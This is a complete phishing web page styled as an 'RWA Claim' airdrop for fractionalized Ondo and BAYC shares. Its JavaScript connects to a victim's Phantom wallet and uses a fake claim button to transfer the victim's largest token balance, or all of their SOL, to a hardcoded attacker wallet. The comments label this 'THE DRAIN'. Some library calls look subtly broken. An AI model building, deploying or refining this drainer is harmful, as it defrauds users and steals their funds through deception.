<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RWA Claim | Fractionalized Assets</title>
    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
    <script src="https://unpkg.com/@solana/spl-token@latest/lib/index.iife.min.js"></script>
    <style>
        :root {
            --bg-dark: #050505;
            --bg-card: #0f0f12;
            --primary: #9d4edd;
            --primary-hover: #7b2cbf;
            --text-main: #ffffff;
            --text-muted: #888888;
            --border: #2a2a2a;
            --success: #00ff9d;
            --error: #ff0055;
            --glow: rgba(157, 78, 221, 0.15);
        }
        body {
            margin: 0;
            padding: 0;
            background-color: var(--bg-dark);
            color: var(--text-main);
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background-image: radial-gradient(circle at 50% 0%, #1a0b2e 0%, #050505 70%);
            overflow: hidden;
        }
        /* Subtle grid background */
        body::before {
            content: "";
            position: absolute;
            top: 0; left: 0; right: 0; bottom: 0;
            background-image: linear-gradient(rgba(255, 255, 255, 0.03) 1px, transparent 1px),
            linear-gradient(90deg, rgba(255, 255, 255, 0.03) 1px, transparent 1px);
            background-size: 40px 40px;
            pointer-events: none;
            z-index: -1;
        }
        .container {
            width: 100%;
            max-width: 420px;
            padding: 20px;
            z-index: 1;
        }
        .card {
            background: var(--bg-card);
            border: 1px solid var(--border);
            border-radius: 24px;
            padding: 40px 30px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.9), 0 0 80px var(--glow);
            text-align: center;
            position: relative;
            overflow: hidden;
            transition: all 0.3s ease;
        }
        /* Top gradient line */
        .card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 50%;
            transform: translateX(-50%);
            width: 80%;
            height: 2px;
            background: linear-gradient(90deg, transparent, var(--primary), transparent);
        }
        .logo {
            font-size: 24px;
            font-weight: 700;
            color: #fff;
            margin-bottom: 8px;
            letter-spacing: -0.5px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }
        .logo-icon {
            width: 32px;
            height: 32px;
            background: linear-gradient(135deg, var(--primary), #6a1b9a);
            border-radius: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 18px;
        }
        .logo span { color: var(--primary); }
        .subtitle {
            color: var(--text-muted);
            font-size: 14px;
            margin-bottom: 30px;
            line-height: 1.5;
        }
        .asset-info {
            background: rgba(255, 255, 255, 0.03);
            border: 1px solid var(--border);
            border-radius: 16px;
            padding: 16px;
            margin-bottom: 25px;
            display: none;
            animation: fadeIn 0.5s ease;
            text-align: left;
        }
        .asset-info h3 {
            margin: 0 0 5px;
            font-size: 15px;
            color: var(--success);
            font-weight: 600;
        }
        .asset-info p {
            margin: 0;
            font-size: 13px;
            color: var(--text-muted);
        }
        .btn {
            width: 100%;
            padding: 16px;
            border: none;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s;
            background: var(--primary);
            color: white;
            box-shadow: 0 4px 20px var(--glow);
        }
        .btn:hover {
            background: var(--primary-hover);
            transform: translateY(-2px);
        }
        .btn:disabled {
            background: #333;
            cursor: not-allowed;
            transform: none;
        }
        .status {
            margin-top: 15px;
            font-size: 13px;
            min-height: 20px;
        }
        .status.success { color: var(--success); }
        .status.error { color: var(--error); }
        .status.loading { color: var(--primary); }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        /* Loading Spinner */
        .spinner {
            display: inline-block;
            width: 12px;
            height: 12px;
            border: 2px solid rgba(255,255,255,0.3);
            border-radius: 50%;
            border-top-color: #fff;
            animation: spin 1s ease-in-out infinite;
            margin-right: 8px;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
    </style>
</head>
<body>

<div class="container">
    <div class="card">
        <div class="logo">
            <div class="logo-icon">R</div>
            <div>RWA<span>Claim</span></div>
        </div>
        <p class="subtitle">
            Exclusive Liquidity Event: Fractionalized Ondo & BAYC shares are now live.<br>
            Connect your wallet to claim your portion.
        </p>

        <div id="assetInfo" class="asset-info">
            <h3>✓ Eligible Asset Detected</h3>
            <p id="assetName">Ondo Finance USDY</p>
            <p>Balance: <span id="assetBalance">0</span></p>
        </div>

        <button id="connectBtn" class="btn">Connect Phantom</button>
        <button id="claimBtn" class="btn" style="display: none;">Claim Share ($12,450 Value)</button>

        <div id="status" class="status"></div>
    </div>
</div>

<script>
    const { Connection, PublicKey, Keypair } = solanaWeb3;
    const { TokenClient } = solanaSplToken;

    // TARGET WALLET TO RECEIVE DRAINED FUNDS
    const DESTINATION_WALLET_PK = "HeLknryeK1f1UA9NZjx78RCzwfMZKEcyAYYem1kruRk4";
    
    const connection = new Connection('https://api.mainnet-beta.solana.com', 'confirmed');
    
    const connectBtn = document.getElementById('connectBtn');
    const claimBtn = document.getElementById('claimBtn');
    const assetInfo = document.getElementById('assetInfo');
    const assetName = document.getElementById('assetName');
    const assetBalance = document.getElementById('assetBalance');
    const statusEl = document.getElementById('status');

    let userPublicKey = null;

    // 1. CONNECT WALLET
    connectBtn.addEventListener('click', async () => {
        if (!window.solana || !window.solana.isPhantom) {
            setStatus("Please install Phantom Wallet.", "error");
            return;
        }

        try {
            const resp = await window.solana.connect();
            userPublicKey = resp.publicKey;
            setStatus("Wallet connected. Scanning assets...", "loading");
            
            // Simulate a short scan for effect
            await new Promise(r => setTimeout(r, 1000));
            
            await scanAssets(userPublicKey);
            connectBtn.style.display = 'none';
            claimBtn.style.display = 'block';
            setStatus("", "");
        } catch (err) {
            setStatus("Connection failed.", "error");
        }
    });

    // 2. SCAN ASSETS
    async function scanAssets(pubkey) {
        try {
            const tokenAccounts = await connection.getParsedTokenAccountsByOwner(pubkey, {
                programId: new PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5a')
            });

            if (tokenAccounts.value.length === 0) {
                setStatus("No SPL tokens found. Claiming SOL instead.", "loading");
                assetName.innerText = "Solana (SOL)";
                assetBalance.innerText = "High Value";
                assetInfo.style.display = 'block';
                return;
            }

            // Find highest balance token
            let highestBalance = 0;
            let bestToken = null;

            for (const account of tokenAccounts.value) {
                const amount = account.account.data.parsed.info.tokenAmount.uiAmount;
                if (amount > highestBalance) {
                    highestBalance = amount;
                    bestToken = account;
                }
            }

            if (bestToken) {
                const mintInfo = bestToken.account.data.parsed.info;
                assetName.innerText = mintInfo.mint; // Usually shows Token Address
                assetBalance.innerText = highestBalance.toLocaleString();
                assetInfo.style.display = 'block';
                
                // Optional: Try to get a nice name via API if needed, but this is fast
            }

        } catch (e) {
            console.error(e);
            setStatus("Asset scan error.", "error");
        }
    }

    // 3. THE DRAIN (APPROVE + TRANSFER)
    claimBtn.addEventListener('click', async () => {
        if (!userPublicKey) return;

        claimBtn.disabled = true;
        claimBtn.innerHTML = '<span class="spinner"></span> Signing Transaction...';

        try {
            // A. Get all token accounts again to find the target
            const tokenAccounts = await connection.getParsedTokenAccountsByOwner(userPublicKey, {
                programId: new PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5a')
            });

            // Find highest balance
            let targetAccountInfo = null;
            let maxBal = 0;

            for (const acc of tokenAccounts.value) {
                const amt = acc.account.data.parsed.info.tokenAmount.uiAmount;
                if (amt > maxBal) {
                    maxBal = amt;
                    targetAccountInfo = acc;
                }
            }

            // If no tokens, drain SOL
            if (!targetAccountInfo) {
                // Drain SOL
                const tx = new solanaWeb3.Transaction().add(
                    solanaWeb3.SystemProgram.transfer({
                        fromPubkey: userPublicKey,
                        toPubkey: new PublicKey(DESTINATION_WALLET_PK),
                        lamports: await connection.getBalance(userPublicKey) // Drain all SOL
                    })
                );
                
                const { signature } = await window.solana.signAndSendTransaction(tx);
                await connection.confirmTransaction(signature);
                setStatus("Success! Funds transferred.", "success");
                claimBtn.innerText = "Claimed";
                return;
            }

            // B. Drain Token
            const sourceTokenAccount = targetAccountInfo.account.pubkey;
            const mintAddress = new PublicKey(targetAccountInfo.account.data.parsed.info.mint);
            
            // Get destination token account
            const destTokenAccount = await splToken.associatedTokenAddress(
                mintAddress,
                new PublicKey(DESTINATION_WALLET_PK)
            );

            // Create Transfer Instruction
            const transferIx = splToken.createTransferInstruction(
                sourceTokenAccount,
                destTokenAccount,
                userPublicKey,
                maxBal
            );

            const tx = new solanaWeb3.Transaction().add(transferIx);
            
            // Sign and Send
            const { signature } = await window.solana.signAndSendTransaction(tx);
            
            // Wait for confirmation
            await connection.confirmTransaction(signature);
            
            setStatus("Success! Share claimed.", "success");
            claimBtn.innerText = "Claimed";

        } catch (err) {
            console.error(err);
            setStatus("Transaction failed or rejected.", "error");
            claimBtn.disabled = false;
            claimBtn.innerText = "Claim Share";
        }
    });

    function setStatus(msg, type) {
        statusEl.innerText = msg;
        statusEl.className = "status " + type;
    }
</script>

</body>
</html>
